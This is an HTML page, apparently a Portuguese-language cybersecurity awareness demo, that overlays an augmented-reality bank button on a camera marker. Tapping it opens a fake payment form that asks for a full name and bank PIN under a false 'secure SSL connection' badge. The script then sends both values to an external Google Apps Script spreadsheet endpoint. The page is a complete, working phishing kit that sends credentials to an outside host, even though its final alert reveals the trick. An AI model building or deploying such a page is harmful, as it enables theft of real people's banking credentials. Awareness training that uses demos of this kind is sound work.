<!DOCTYPE html>
<html>
<head>
    <title>Demo Cibersegurança - Ataque Híbrido</title>
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
    <style>
        /* Tela de captura que aparece sobre a RA */
        #hacker-form {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(15, 15, 15, 0.98); padding: 25px; border-radius: 15px;
            z-index: 9999; display: none; text-align: center; color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            border: 2px solid #e74c3c; box-shadow: 0 0 20px rgba(231, 76, 60, 0.5);
            width: 80%; max-width: 300px;
        }
        input { 
            padding: 12px; width: 90%; margin: 10px 0; border-radius: 8px; 
            border: 1px solid #444; background: #222; color: white; font-size: 16px;
        }
        button { 
            padding: 12px 25px; background: #e74c3c; color: white; 
            border: none; border-radius: 8px; cursor: pointer; font-weight: bold;
            width: 100%; margin-top: 10px;
        }
        .status { color: #888; font-size: 12px; margin-top: 10px; }
    </style>
</head>

<body style="margin: 0px; overflow: hidden;">

    <div id="hacker-form">
        <h2 style="color: #e74c3c; margin-top: 0;">PAGAMENTO</h2>
        <p>Identifique-se para continuar:</p>
        <input type="text" id="nome-input" placeholder="Seu Nome Completo">
        <input type="password" id="pin-input" placeholder="Digite seu PIN do Banco" inputmode="numeric" pattern="[0-9]*">
        <button onclick="enviarDados()">CONFIRMAR PAGAMENTO</button>
        <div class="status">🔒 Conexão Segura SSL Ativa</div>
    </div>

    <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;">
        <a-assets>
            <img id="btnBanco" src="botao_banco2.png">
        </a-assets>

        <a-entity cursor="rayOrigin: mouse" raycaster="objects: .clickable"></a-entity>

        <a-marker type="pattern" url="marker.patt">
            <a-image id="target" class="clickable" src="#btnBanco" 
                     position="0 0.1 0" rotation="-90 0 0" 
                     width="2.5" height="3.0"
                     onclick="mostrarFormulario()">
            </a-image>

            <a-plane class="clickable" position="0 0.15 0" rotation="-90 0 0" 
                     width="2.6" height="3.1" material="opacity: 0.2; color: red" 
                     onclick="mostrarFormulario()">
            </a-plane>
        </a-marker>

        <a-entity camera></a-entity>
    </a-scene>

    <script>
        const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";

        function mostrarFormulario() {
            // Abre o formulário HTML na frente da câmera
            document.getElementById('hacker-form').style.display = 'block';
        }

        function enviarDados() {
            const nome = document.getElementById('nome-input').value;
            const pin = document.getElementById('pin-input').value;

            if (!nome || !pin) {
                alert("Por favor, preencha todos os campos para continuar.");
                return;
            }

            // Feedback visual no botão
            const btn = document.querySelector('button');
            btn.innerHTML = "PROCESSANDO...";
            btn.disabled = true;

            // ENVIO PARA A PLANILHA
            fetch(`${linkPlanilha}?nome=${encodeURIComponent(nome)}&senha=${encodeURIComponent(pin)}`, {
                method: 'POST',
                mode: 'no-cors'
            })
            .then(() => {
                alert("🚨 OPERAÇÃO CONCLUÍDA!\n\nSeu pagamento foi 'processado' com sucesso.\n\n(Dica: Olhe os dados na planilha agora!)");
                
                // Limpa e reseta
                document.getElementById('nome-input').value = "";
                document.getElementById('pin-input').value = "";
                document.getElementById('hacker-form').style.display = 'none';
                btn.innerHTML = "CONFIRMAR PAGAMENTO";
                btn.disabled = false;
            })
            .catch(err => {
                alert("Erro de conexão. Tente novamente.");
                btn.innerHTML = "CONFIRMAR PAGAMENTO";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
